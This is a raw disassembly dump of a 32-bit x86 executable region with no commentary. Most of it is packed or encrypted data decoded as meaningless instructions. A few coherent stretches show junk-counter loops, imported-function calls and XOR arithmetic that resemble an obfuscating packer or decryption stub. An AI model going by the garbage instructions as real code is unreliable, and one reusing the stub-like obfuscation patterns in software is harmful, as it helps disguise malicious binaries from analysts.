  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x40509b
  40511a:	mov    al,0xf4
  40511c:	sbb    DWORD PTR [esi],edx
  40511e:	or     al,0xb7
  405120:	aam    0xc3
  405122:	xchg   esp,eax
  405123:	cmp    cl,dh
  405125:	ja     0x405159
  405127:	and    DWORD PTR [edx+0x1078a50f],0x6e
  40512e:	sub    BYTE PTR [esi+0x38],cl
  405131:	or     DWORD PTR [ecx-0x10b22af9],0x53edd0f5
  40513b:	outs   dx,BYTE PTR ds:[esi]
  40513c:	stc    
  40513d:	sub    bl,BYTE PTR [ebx-0x11f4be67]
  405143:	bound  edi,QWORD PTR [ebp-0x628a474]
  405149:	mov    esi,0x2caebd00
  40514e:	(bad)  
  405150:	fs push esi
  405152:	cmp    ch,al
  405154:	(bad)  
  405155:	fstp   QWORD PTR [edx]
  405157:	adc    bh,al
  405159:	mov    dh,0x89
  40515b:	ret    0xc678
  40515e:	popf   
  40515f:	into   
  405160:	jb     0x4051bd
  405162:	inc    esi
  405163:	in     eax,0x3f
  405165:	adc    BYTE PTR [edx+ecx*4],ch
  405168:	push   0x3d4530e8
  40516d:	inc    ebp
  40516e:	push   esp
  40516f:	fwait
  405170:	ror    DWORD PTR [ebx+0x568b06f6],0xf8
  405177:	add    bh,BYTE PTR ss:[esi]
  40517a:	inc    esi
  40517b:	jmp    0x40518a
  40517d:	and    al,0x93
  40517f:	sbb    DWORD PTR [ebx+0x29d80b31],0x27
  405186:	jb     0x405187
  405188:	jb     0x405112
  40518a:	nop
  40518b:	pop    edx
  40518c:	xchg   edx,eax
  40518d:	retf   0xac05
  405190:	push   ebx
  405191:	in     eax,0xc6
  405193:	cmc    
  405194:	mov    esi,0x5e578245
  405199:	inc    eax
  40519a:	pop    ss
  40519b:	cmp    eax,0x593440d6
  4051a0:	mov    eax,ds:0x9a88f551
  4051a5:	mov    ds,esp
  4051a7:	adc    BYTE PTR [ebx],dl
  4051a9:	pop    edi
  4051aa:	stc    
  4051ab:	xchg   ebx,eax
  4051ac:	cmp    ah,BYTE PTR [edi-0xa]
  4051af:	and    al,0x2e
  4051b1:	adc    al,0xe0
  4051b3:	rcl    ecx,0x65
  4051b6:	out    dx,al
  4051b7:	xor    BYTE PTR es:[esi+ebp*4-0x4e],cl
  4051bc:	xchg   ebp,eax
  4051bd:	pop    ss
  4051be:	cs loopne 0x4051db
  4051c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c2:	mov    DWORD PTR [edi-0xb],eax
  4051c5:	hlt    
  4051c6:	and    BYTE PTR [ecx+eiz*4-0x41],bl
  4051ca:	sbb    BYTE PTR [ebp+0x3d],ch
  4051cd:	(bad)  
  4051ce:	lock dec edx
  4051d0:	mov    ebx,0x43c212ca
  4051d5:	jecxz  0x40523a
  4051d7:	or     BYTE PTR [ebp-0x21],ch
  4051da:	push   esp
  4051db:	xchg   edx,eax
  4051dc:	pop    edx
  4051dd:	dec    ebx
  4051de:	rcr    DWORD PTR [eax],1
  4051e0:	imul   edx,DWORD PTR [ebp-0x4776bebd],0xb35775f4
  4051ea:	xor    eax,0xbd44f578
  4051ef:	bound  ebx,QWORD PTR [eax]
  4051f1:	cmc    
  4051f2:	cmp    ecx,DWORD PTR [edi+0x20e4b226]
  4051f8:	iret   
  4051f9:	or     eax,0xc3879478
  4051fe:	pop    ebp
  4051ff:	push   ebx
  405200:	fcmovnbe st,st(7)
  405202:	into   
  405203:	aaa    
  405204:	imul   ebx,ebp,0x30
  405207:	mov    cl,0x85
  405209:	sub    BYTE PTR [ebx],bh
  40520b:	mov    eax,ds:0x3c8c8105
  405210:	mov    al,0xd
  405212:	cs imul ebx,eax,0xb05b9893
  405219:	sbb    ebx,DWORD PTR [edi+0x22e4f19]
  40521f:	out    0xce,al
  405221:	sbb    BYTE PTR ds:0x1ad1f213,dh
  405227:	xor    edi,eax
  405229:	inc    ecx
  40522a:	(bad)  
  40522c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40522d:	daa    
  40522e:	mov    bh,0xd7
  405230:	bound  ecx,QWORD PTR [ecx]
  405232:	fs dec ebx
  405234:	data16 mov ds:0x44023299,al
  40523a:	test   DWORD PTR [edx+edx*1+0x3],ebx
  40523e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40523f:	stos   BYTE PTR es:[edi],al
  405240:	(bad)  
  405241:	aad    0xff
  405243:	and    eax,0x32ab69ac
  405248:	fadd   DWORD PTR [edx-0x8]
  40524b:	je     0x40523e
  40524d:	sub    al,0x8a
  40524f:	cli    
  405250:	xor    eax,0x3dea4b81
  405255:	jmp    0xd8cc:0xced1e320
  40525c:	idiv   BYTE PTR [ebx+0x2e]
  40525f:	ror    eax,0x9c
  405262:	popa   
  405263:	xchg   BYTE PTR [edx+0x384710da],bl
  405269:	cmp    bh,dl
  40526b:	xchg   BYTE PTR [esi-0x28],ch
  40526e:	cmp    eax,0xed7baa74
  405273:	push   edx
  405274:	dec    ebp
  405275:	gs dec esp
  405277:	loop   0x405221
  405279:	ret    0x5d2d
  40527c:	nop
  40527d:	cmp    DWORD PTR [edx+0x7],ecx
  405280:	repnz cli 
  405282:	ret    
  405283:	xor    al,0xde
  405285:	(bad)  
  405286:	fldz   
  405288:	mov    al,ds:0x28b22832
  40528d:	and    DWORD PTR [edx],0x7585df24
  405293:	mov    cl,0xd4
  405295:	imul   eax,DWORD PTR [ebx-0x14a9c553],0x2a35bb34
  40529f:	push   0x9a6624f6
  4052a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052a5:	jno    0x4052b6
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xf3c6d209
  405456:	pop    esi
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x4054a8
  405460:	push   es
  405461:	jne    0x4053fb
  405463:	xchg   ebx,ecx
  405465:	shl    DWORD PTR [esi+0x76c62736],1
  40546b:	and    al,0xf0
  40546d:	fwait
  40546e:	ins    BYTE PTR es:[edi],dx
  40546f:	jbe    0x405407
  405471:	adc    esi,DWORD PTR [edi]
  405473:	(bad)  
  405474:	adc    edi,DWORD PTR [eax+0x54]
  405477:	aad    0xc2
  405479:	imul   edi,DWORD PTR [eax-0x7cf4161f],0x25
  405480:	mov    eax,0xdbeeccbb
  405485:	in     al,0xe5
  405487:	ds cdq 
  405489:	test   eax,0x568081d3
  40548e:	mov    ds:0x4c0d26a5,al
  405493:	push   es
  405494:	cs cmp ah,cl
  405497:	stos   BYTE PTR es:[edi],al
  405498:	push   es
  405499:	and    al,0x2a
  40549b:	jle    0x4054f2
  40549d:	jl     0x405436
  40549f:	xor    BYTE PTR [ecx+0x1bfd7dbd],ah
  4054a5:	and    eax,0xf83f0457
  4054aa:	mov    ds:0xfec9ef6b,eax
  4054af:	xchg   edx,eax
  4054b0:	inc    esi
  4054b1:	fisubr DWORD PTR [edi+0x22a524e]
  4054b7:	sub    eax,0xfbcb079a
  4054bc:	outs   dx,BYTE PTR ds:[esi]
  4054bd:	outs   dx,BYTE PTR ds:[esi]
  4054be:	mov    esp,0x6f87eaa0
  4054c3:	into   
  4054c4:	fcmove st,st(5)
  4054c6:	imul   esi,ebx,0x8
  4054c9:	(bad)  
  4054cb:	or     ah,BYTE PTR [edi]
  4054cd:	pop    esi
  4054ce:	lods   al,BYTE PTR ds:[esi]
  4054cf:	mov    esp,0x98e9ef05
  4054d4:	inc    ebp
  4054d5:	adc    BYTE PTR [ecx],0x76
  4054d8:	xchg   esp,eax
  4054d9:	shr    BYTE PTR [esi+ebp*4+0xd887bd9],cl
  4054e0:	aad    0xe2
  4054e2:	(bad)  
  4054e3:	rcr    BYTE PTR [esi],1
  4054e5:	adc    BYTE PTR [ebp+0x432f39c3],dh
  4054eb:	dec    eax
  4054ec:	and    al,0xe6
  4054ee:	push   ecx
  4054ef:	popa   
  4054f0:	jmp    0x4054a7
  4054f2:	jmp    0xba0fa36b
  4054f7:	es and edi,ebp
  4054fa:	adc    edi,edx
  4054fc:	or     cl,al
  4054fe:	mov    dh,0x8d
  405500:	sub    ecx,ebp
  405502:	inc    BYTE PTR [esi-0x7e]
  405505:	and    ecx,DWORD PTR [ecx-0x3ec530f3]
  40550b:	push   cs
  40550c:	xor    BYTE PTR [edx-0x4247e243],ch
  405512:	pop    esp
  405513:	in     al,0x1c
  405515:	sub    ah,BYTE PTR [edi]
  405517:	(bad)  
  405519:	inc    ebx
  40551a:	bound  ecx,QWORD PTR [edi-0x1b]
  40551d:	lahf   
  40551e:	fild   WORD PTR [edi]
  405520:	jmp    0x78a7:0xbe269f64
  405527:	je     0x4055a4
  405529:	rcr    DWORD PTR [edi],cl
  40552b:	cwde   
  40552c:	in     eax,0x7b
  40552e:	aam    0x1c
  405530:	fcom   QWORD PTR [edx+0x5c]
  405533:	ds jp  0x4054ca
  405536:	dec    esp
  405537:	or     BYTE PTR [ebx-0x617c2cca],cl
  40553d:	and    edi,esi
  40553f:	cmp    al,0x95
  405541:	or     DWORD PTR ds:0x244af89e,ecx
  405547:	out    dx,eax
  405548:	pop    ebp
  405549:	push   eax
  40554a:	push   ds
  40554b:	mov    eax,ds:0x72811d62
  405550:	push   edi
  405551:	sbb    eax,DWORD PTR [edi+0x25]
  405554:	jae    0x405589
  405556:	or     dh,BYTE PTR cs:[ebp-0x6a7360b0]
  40555d:	mov    bh,0xdc
  40555f:	bt     DWORD PTR [edi-0x64],eax
  405563:	clc    
  405564:	adc    ecx,edi
  405566:	les    ecx,FWORD PTR [ecx+0x20]
  405569:	push   esp
  40556a:	pop    ebx
  40556b:	jmp    0x9698:0xd6f72c7c
  405572:	push   edx
  405573:	xchg   esi,eax
  405574:	jmp    DWORD PTR [ebp-0x28]
  405577:	(bad)  
  405578:	cs test al,0x7d
  40557b:	push   ss
  40557c:	inc    eax
  40557d:	jle    0x40552d
  40557f:	xor    eax,0x7dbb24da
  405584:	jl     0x405598
  405586:	xor    eax,0x25435d95
  40558b:	popa   
  40558c:	mov    WORD PTR [ecx],?
  40558e:	enter  0x7c3e,0xab
  405592:	lea    ebp,[esi-0x78f0db9d]
  405598:	sbb    DWORD PTR [ecx+eiz*4],0x3a7dfc15
  40559f:	cmp    al,0x8e
  4055a1:	mov    al,ds:0x670dc8a8
  4055a6:	push   edi
  4055a7:	pop    ebp
  4055a8:	outs   dx,BYTE PTR ds:[esi]
  4055a9:	push   eax
  4055aa:	adc    eax,0xa827d983
  4055af:	aas    
  4055b0:	or     ebx,esi
  4055b2:	lock outs dx,DWORD PTR ds:[esi]
  4055b4:	sbb    bl,ah
  4055b6:	cmp    ch,BYTE PTR [ecx+ecx*8]
  4055b9:	and    DWORD PTR [edi],ecx
  4055bb:	int3   
  4055bc:	xchg   edx,eax
  4055bd:	push   esp
  4055be:	in     al,dx
  4055bf:	shr    bh,0x7
  4055c2:	pop    esi
  4055c3:	dec    ecx
  4055c4:	xchg   edi,eax
  4055c5:	mov    ebp,0xd1ac3188
  4055ca:	ins    DWORD PTR es:[edi],dx
  4055cb:	dec    edx
  4055cc:	out    0x60,al
  4055ce:	push   cs
  4055cf:	or     ecx,DWORD PTR [ebx]
  4055d1:	test   eax,0xee32cc28
  4055d6:	and    BYTE PTR [edi-0x78],dl
  4055d9:	sbb    al,BYTE PTR [ebx]
  4055db:	push   ss
  4055dc:	push   eax
  4055dd:	loopne 0x4055b5
  4055df:	mov    ds:0x1160c590,al
  4055e4:	jns    0x405608
  4055e6:	cmp    al,BYTE PTR [eax]
  4055e8:	add    BYTE PTR [ecx-0x37],dl
  4055eb:	cmp    dh,BYTE PTR [esp+ebx*4+0x1f]
  4055ef:	pop    ebp
  4055f0:	mov    BYTE PTR [edx-0x4e],ch
  4055f3:	fisubr DWORD PTR [esi+ecx*4]
  4055f6:	ror    DWORD PTR [edi],cl
  4055f8:	mov    bh,BYTE PTR [edi-0x233732a7]
  4055fe:	out    dx,al
  4055ff:	xchg   DWORD PTR [ebx+ecx*4+0x4359c840],esi
  405606:	mov    DWORD PTR [edi-0x906235f],edx
  40560c:	xlat   BYTE PTR ds:[ebx]
  40560d:	add    DWORD PTR [ebp-0x216545d0],ebp
  405613:	xor    dl,cl
  405615:	mov    ah,al
  405617:	pop    esi
  405618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405619:	and    ecx,DWORD PTR [edi]
  40561b:	out    dx,eax
  40561c:	dec    esp
  40561d:	retf   0xba74
  405620:	das    
  405621:	push   0x979595a3
  405626:	jg     0x405667
  405628:	fwait
  405629:	cmp    ebx,DWORD PTR [ebp*2+0x2244b49]
  405630:	fndisi(8087 only) 
  405632:	push   ebx
  405633:	outs   dx,DWORD PTR ds:[esi]
  405634:	inc    edi
  405635:	lds    ecx,FWORD PTR [ecx]
  405637:	cmp    al,0x32
  405639:	add    DWORD PTR [ecx-0x19],0xb7588f6e
  405640:	xchg   BYTE PTR [ebx+0x39ae6428],dh
  405646:	rol    BYTE PTR [ecx+eax*1-0x10cac734],0x85
  40564e:	inc    DWORD PTR [esi+0x4f]
  405651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405652:	xchg   DWORD PTR [esi+0x4e818a42],esi
  405658:	int3   
  405659:	call   0x9166:0xec152001
  405660:	sti    
  405661:	scas   al,BYTE PTR es:[edi]
  405662:	pop    ebx
  405663:	add    esp,0xffffff8d
  405666:	(bad)  [edi+0x3d]
  405669:	push   cs
  40566a:	push   esp
  40566b:	test   DWORD PTR [esi-0x1d],ecx
  40566e:	cmp    dh,0xb0
  405671:	in     al,0xd
  405673:	jb     0x40563f
  405675:	aam    0xea
  405677:	sar    BYTE PTR [ebp+0x7b0ed4e8],cl
  40567d:	pushf  
  40567e:	fwait
  40567f:	mov    dl,0x81
  405681:	into   
  405682:	jbe    0x4056ec
  405684:	jle    0x4056fb
  405686:	dec    edx
  405687:	pop    ds
  405688:	mov    BYTE PTR [esi+0x29],ah
  40568b:	retf   
  40568c:	xor    eax,0xffffffa6
  40568f:	add    eax,DWORD PTR [ecx+0x6ab1138c]
  405695:	cdq    
  405696:	or     esi,DWORD PTR [eax+0x7d]
  405699:	in     eax,0xd5
  40569b:	lahf   
  40569c:	add    dl,bh
  40569e:	mov    ebp,edx
  4056a0:	mov    BYTE PTR [ecx+ecx*1],bh
  4056a3:	outs   dx,DWORD PTR ds:[esi]
  4056a4:	mov    ebx,es
  4056a6:	push   es
  4056a7:	dec    edi
  4056a8:	cmp    BYTE PTR [edi-0xce94ee2],0x5d
  4056af:	push   esi
  4056b0:	dec    edx
  4056b1:	sub    ebp,edi
  4056b3:	test   BYTE PTR [ebx+0x2c],cl
  4056b6:	adc    ebp,DWORD PTR [ebx+eiz*8+0x14]
  4056ba:	xor    eax,0xb760c594
  4056bf:	in     eax,dx
  4056c0:	mov    bh,0xf0
  4056c2:	pop    esi
  4056c3:	pop    esp
  4056c4:	jnp    0x405701
  4056c6:	sbb    al,0x9a
  4056c8:	sbb    BYTE PTR [esp+edi*2-0x28],0x9d
  4056cd:	dec    edx
  4056ce:	mov    BYTE PTR [edi-0x18],dh
  4056d1:	or     bl,BYTE PTR [eax-0x6aaccfa7]
  4056d7:	cmp    DWORD PTR [ebp-0x1],esi
  4056da:	inc    esi
  4056db:	aam    0xe6
  4056dd:	nop
  4056de:	sub    esi,DWORD PTR [esi+0x57]
  4056e1:	xchg   esi,eax
  4056e2:	ja     0x4056db
  4056e4:	or     ebx,ecx
  4056e6:	push   0x1e
  4056e8:	imul   ebx,DWORD PTR [eax],0x3f6c78c6
  4056ee:	adc    BYTE PTR [edi+0x1b],0xea
  4056f2:	pop    ds
  4056f3:	mov    ch,0x95
  4056f5:	daa    
  4056f6:	loope  0x40569c
  4056f8:	jle    0x4056d9
  4056fa:	cli    
  4056fb:	adc    ebp,ecx
  4056fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056fe:	shl    BYTE PTR [edx],0xb9
  405701:	shr    BYTE PTR [ebp+0x49881adf],1
  405707:	(bad)  [edx-0x4afd9423]
  40570d:	mov    BYTE PTR [esi+ebx*2+0x6ea83303],ch
  405714:	test   DWORD PTR [ecx+0x30],ebp
  405717:	test   eax,0xc09bc753
  40571c:	cs jae 0x4056d8
  40571f:	jns    0x40577b
  405721:	rol    ecx,1
  405723:	cmp    BYTE PTR [edx+ebx*4+0x21008de8],dh
  40572a:	xor    eax,0xaf10aaf7
  40572f:	scas   eax,DWORD PTR es:[edi]
  405730:	mov    BYTE PTR [edx],al
  405732:	xchg   DWORD PTR ds:0x979977d,esi
  405738:	xor    DWORD PTR [edx-0x37df6881],eax
  40573e:	sbb    eax,0xbc0fbe19
  405743:	push   ss
  405744:	mov    edx,0x66607468
  405749:	dec    ebp
  40574a:	stos   BYTE PTR es:[edi],al
  40574b:	sub    DWORD PTR [ecx-0x1f1742b3],ecx
  405751:	dec    ecx
  405752:	in     al,0x10
  405754:	stos   DWORD PTR es:[edi],eax
  405755:	sub    cl,bl
  405757:	dec    ecx
  405758:	in     eax,0x87
  40575a:	repnz or DWORD PTR [esi+0x60097fe8],esp
  405761:	adc    al,0xc6
  405763:	outs   dx,BYTE PTR ds:[esi]
  405764:	pusha  
  405765:	dec    ebx
  405766:	and    al,0x6d
  405768:	inc    ebx
  405769:	and    al,0xc3
  40576b:	mov    dl,0x21
  40576d:	xchg   ebp,eax
  40576e:	pop    edx
  40576f:	ficom  WORD PTR [ebx]
  405771:	sti    
  405772:	aam    0x6f
  405774:	add    bl,bl
  405776:	push   edi
  405777:	repz repz (bad) 
  40577a:	lods   eax,DWORD PTR ds:[esi]
  40577b:	mov    ebx,DWORD PTR [edi-0x3e]
  40577e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40577f:	mov    WORD PTR [ebx],?
  405781:	and    al,0xaa
  405783:	add    bl,ch
  405785:	aam    0x1c
  405787:	aas    
  405788:	dec    esi
  405789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40578a:	xor    eax,0x5373d038
  40578f:	mov    esi,DWORD PTR [edi-0x38e55841]
  405795:	out    0x70,eax
  405797:	out    dx,al
  405798:	inc    ebx
  405799:	stos   BYTE PTR es:[edi],al
  40579a:	jecxz  0x40573b
  40579c:	push   0x6f820800
  4057a1:	xchg   ebx,eax
  4057a2:	adc    edi,edx
  4057a4:	push   ebp
  4057a5:	pop    esi
  4057a6:	(bad)  
  4057a7:	repz mov ch,0x6d
  4057aa:	dec    edx
  4057ab:	push   0x385aae8c
  4057b0:	outs   dx,DWORD PTR ds:[esi]
  4057b1:	inc    ecx
  4057b2:	iret   
  4057b3:	lods   eax,DWORD PTR ds:[esi]
  4057b4:	mov    ah,0x42
  4057b6:	inc    eax
  4057b7:	jae    0x40577a
  4057b9:	retf   0x4d10
  4057bc:	outs   dx,BYTE PTR ds:[esi]
  4057bd:	stos   BYTE PTR es:[edi],al
  4057be:	sbb    al,0x40
  4057c0:	push   0x24
  4057c2:	adc    al,0x25
  4057c4:	sub    BYTE PTR [ecx],al
  4057c6:	mov    ebx,0x97eb0dd4
  4057cb:	or     eax,0xf261ec6c
  4057d0:	jge    0x405850
  4057d2:	in     al,dx
  4057d3:	fld    st(2)
  4057d5:	shl    BYTE PTR [ebp+0x780732b1],0x47
  4057dc:	repz (bad) 
  4057de:	jle    0x4057e9
  4057e0:	test   DWORD PTR [eax],ecx
  4057e2:	jne    0x405781
  4057e4:	adc    al,0x12
  4057e6:	pop    eax
  4057e7:	mov    bl,0x3d
  4057e9:	jmp    0x405775
  4057eb:	mov    ebx,0x1b4095ab
  4057f0:	dec    esp
  4057f1:	inc    edx
  4057f2:	push   ebx
  4057f3:	adc    edx,ebp
  4057f5:	sbb    esp,DWORD PTR [edi-0x8]
  4057f8:	(bad)  
  4057f9:	mov    eax,0xe034b7fb
  4057fe:	repz shr ebp,0x5d
  405802:	(bad)  
  405803:	cmp    bh,BYTE PTR [eax+0x35dca2df]
  405809:	mov    edi,0xd9a634c7
  40580e:	jecxz  0x4057a7
  405810:	cwde   
  405811:	jno    0x40586a
  405813:	adc    eax,0xd9d0824b
  405818:	pop    ecx
  405819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40581a:	adc    BYTE PTR [edi],cl
  40581c:	div    BYTE PTR [ecx]
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8+0x506b033c],bh
  405847:	pushf  
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0x927e7e71
  405851:	cmp    eax,0xbd6fb619
  405856:	scas   al,BYTE PTR es:[edi]
  405857:	loope  0x405870
  405859:	rol    BYTE PTR [ecx],cl
  40585b:	pop    ss
  40585c:	jne    0x40583b
  40585e:	jbe    0x405825
  405860:	out    dx,al
  405861:	inc    edi
  405862:	mov    ch,0x32
  405864:	loopne 0x4057fe
  405866:	ret    0x7f8a
  405869:	ret    0x6cc
  40586c:	cmp    dh,ah
  40586e:	adc    esi,DWORD PTR [ebp-0x4431b4a1]
  405874:	push   edi
  405875:	shr    BYTE PTR [edx+0x7c],cl
  405878:	scas   al,BYTE PTR es:[edi]
  405879:	push   cs
  40587a:	out    dx,al
  40587b:	xchg   ebp,eax
  40587c:	pop    eax
  40587d:	lea    ecx,[esi+0x15c873c9]
  405883:	call   0x88a8:0x1aecd8ac
  40588a:	lods   eax,DWORD PTR ds:[esi]
  40588b:	fisubr WORD PTR ds:0xe397bd8
  405891:	fisttp QWORD PTR [eax+edi*8]
  405894:	sub    ebx,DWORD PTR [ebp+0x4d]
  405897:	aad    0x57
  405899:	jmp    0x405870
  40589b:	scas   eax,DWORD PTR es:[edi]
  40589c:	(bad)  
  40589d:	iret   
  40589e:	dec    ebx
  40589f:	xchg   ecx,eax
  4058a0:	push   es
  4058a1:	cli    
  4058a2:	inc    ebx
  4058a3:	jne    0x4058f0
  4058a5:	jmp    0x405874
  4058a7:	stos   BYTE PTR es:[edi],al
  4058a8:	pop    edx
  4058a9:	cwde   
  4058aa:	or     al,0x7f
  4058ac:	out    dx,eax
  4058ad:	or     BYTE PTR [ebp-0x7e],dh
  4058b0:	mov    bh,0x3b
  4058b2:	push   ebx
  4058b3:	sahf   
  4058b4:	stc    
  4058b5:	sub    eax,0xfaa0d21
  4058ba:	(bad)  
  4058bb:	xor    ebp,DWORD PTR [ecx-0x34]
  4058be:	mov    BYTE PTR [edx],dh
  4058c0:	xchg   esi,eax
  4058c1:	and    ebx,DWORD PTR [esi+ecx*1]
  4058c4:	lods   al,BYTE PTR ds:[esi]
  4058c5:	and    DWORD PTR gs:[esi-0x40],eax
  4058c9:	xchg   BYTE PTR [esi+ecx*1+0x75fb57d7],ch
  4058d0:	mov    WORD PTR [ecx-0x21],ss
  4058d3:	mov    cl,0x4b
  4058d5:	xor    ch,dh
  4058d7:	(bad)  
  4058da:	inc    esp
  4058db:	push   ds
  4058dc:	pop    ecx
  4058dd:	pop    eax
  4058de:	ss (bad) 
  4058e1:	out    0x76,eax
  4058e3:	xor    al,0x1d
  4058e5:	push   ds
  4058e6:	int    0x48
  4058e8:	push   ebp
  4058e9:	loop   0x4058fd
  4058eb:	pop    ds
  4058ec:	jmp    0x4058d4
  4058ee:	add    BYTE PTR [eax-0x57],0xa1
  4058f2:	call   0x842796b5
  4058f7:	xor    al,0x18
  4058f9:	sub    eax,0x642a653c
  4058fe:	push   ebp
  4058ff:	rcr    DWORD PTR [ebx],0x90
  405902:	retf   
  405903:	lgs    ebx,FWORD PTR [esi]
  405906:	rcr    BYTE PTR [edi+eax*2],cl
  405909:	adc    al,0x5a
  40590b:	jmp    0xa039b967
  405910:	pop    edx
  405911:	xlat   BYTE PTR ds:[ebx]
  405912:	sub    ch,BYTE PTR [esi+0x14c88538]
  405918:	inc    ebp
  405919:	retf   
  40591a:	inc    edi
  40591b:	call   FWORD PTR [esi-0x7c908bde]
  405921:	sbb    eax,0x966ae2f3
  405926:	fldenv [edi-0x78]
  405929:	pushf  
  40592a:	das    
  40592b:	mov    dh,0xc5
  40592d:	add    BYTE PTR [ebx+0x3d80593e],0xcc
  405934:	lea    ebp,[ebp-0x62c40b53]
  40593a:	inc    esp
  40593b:	cli    
  40593c:	sti    
  40593d:	sti    
  40593e:	jp     0x4059a9
  405940:	xchg   ebx,eax
  405941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405942:	aad    0x8b
  405944:	popa   
  405945:	in     al,dx
  405946:	test   al,0xcc
  405948:	popf   
  405949:	and    DWORD PTR [edx],edi
  40594b:	jecxz  0x405938
  40594d:	adc    bh,BYTE PTR [eax+0x65]
  405950:	jno    0x40599b
  405952:	mov    edi,0xb5b13fca
  405957:	sar    DWORD PTR [edi-0x1fbd0116],cl
  40595d:	mov    edx,0xd44b27eb
  405962:	push   esi
  405963:	jmp    DWORD PTR [edi]
  405965:	lods   eax,DWORD PTR ds:[esi]
